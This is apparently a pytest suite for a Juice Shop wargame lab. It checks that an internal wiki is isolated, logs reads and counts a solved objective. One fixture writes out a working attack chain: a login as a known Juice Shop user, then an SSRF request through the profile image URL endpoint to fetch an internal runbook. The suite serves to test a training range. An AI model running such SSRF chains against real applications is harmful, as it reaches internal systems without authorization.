import subprocess

import pytest
import requests

from conftest import PLATFORM_URL, REPO_ROOT

INSIDE = "http://wiki.internal/"
SECRET = "/runbooks/deploy.html"
OBJECTIVE = "internalRunbookRead"

def _in(container, *argv, timeout=60):
    return subprocess.run(
        ["docker", "exec", container, *argv],
        capture_output=True, text=True, timeout=timeout,
    )

def _status_from(container, url, node=False):
    if node:
                                                                             
                                                        
        script = (
            f"require('http').get('{url}', r => {{ console.log(r.statusCode);"
            f" r.resume(); r.on('end', () => process.exit(0)); }})"
            f".on('error', () => {{ console.log('000'); process.exit(0); }});"
        )
        return _in(container, "/nodejs/bin/node", "-e", script, timeout=30).stdout.strip()
    return _in(
        container, "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
        "--max-time", "8", "--noproxy", "*", url,
    ).stdout.strip()

def test_the_inside_is_not_reachable_from_the_internet(stack_is_up):
                                                                              
                                                                 
    assert _status_from("fsl-kali", INSIDE) == "000", (
        "the attacker's box can reach the internal wiki directly"
    )

def test_the_inside_is_reachable_from_the_application(stack_is_up):
                                                                          
    assert _status_from("fsl-juice-shop", INSIDE, node=True) == "200"

def test_the_wiki_keeps_its_own_record_of_what_was_read(stack_is_up):
    before = _in("fsl-wiki", "wc", "-l", "/var/log/nginx/read.log").stdout.split()[0]
    _status_from("fsl-juice-shop", f"http://wiki.internal{SECRET}", node=True)
    after = _in("fsl-wiki", "wc", "-l", "/var/log/nginx/read.log").stdout.split()[0]

    assert int(after) > int(before), (
        "the wiki did not record being read, so nothing can judge whether the "
        "inside was reached except our own opinion of the traffic"
    )

def test_the_inside_is_an_objective_the_target_judges(stack_is_up):
    offered = requests.get(
        f"{PLATFORM_URL}/api/wargames/juice-shop/objectives/", timeout=60
    ).json()
    internal = next((o for o in offered if o["key"] == OBJECTIVE), None)

    assert internal, f"{OBJECTIVE} is not on the board"
    assert internal["difficulty"] >= 1 and internal["category"]

@pytest.fixture(scope="module")
def taken_through_the_app(stack_is_up):
    (REPO_ROOT / "deploy/wiki/logs/read.log").write_text("")

    script = f'''
      T=$(curl -s --max-time 20 -H "Content-Type: application/json" \\
        -d '{{"email":"jim@juice-sh.op","password":"ncc-1701"}}' \\
        "$FSL_TARGET/rest/user/login" | jq -r .authentication.token)
      [ -n "$T" ] || exit 1
      curl -s -o /dev/null --max-time 25 -b "token=$T" -H "Authorization: Bearer $T" \\
        --data-urlencode "imageUrl=http://wiki.internal{SECRET}" \\
        "$FSL_TARGET/profile/image/url"
    '''
    run = _in("fsl-kali", "bash", "-c", script, timeout=180)
    assert run.returncode == 0, f"the chain did not run: {run.stderr[:300]}"

    import time
    time.sleep(4)
    return _in("fsl-wiki", "tail", "-5", "/var/log/nginx/read.log").stdout

def test_the_application_can_be_made_to_read_the_inside(taken_through_the_app):
    assert SECRET in taken_through_the_app, (
        "the attacker logged in and asked the app to fetch the internal wiki, "
        "and the wiki never saw it - the lateral movement path is gone"
    )

def test_the_visit_came_from_the_application_not_from_outside(taken_through_the_app):
                                                                              
                                                                    
    reads = [l for l in taken_through_the_app.splitlines() if SECRET in l]

    assert reads
    assert any("172.30." in line for line in reads), reads

def test_reaching_the_inside_is_scored(taken_through_the_app):
    taken = requests.get(
        f"{PLATFORM_URL}/api/wargames/juice-shop/objectives/", timeout=60
    ).json()
    internal = next(o for o in taken if o["key"] == OBJECTIVE)

    assert internal["solved"], "the inside was read and nothing counted it"
    assert internal["solved_at"], "no time for it, so it can be attributed to nobody"
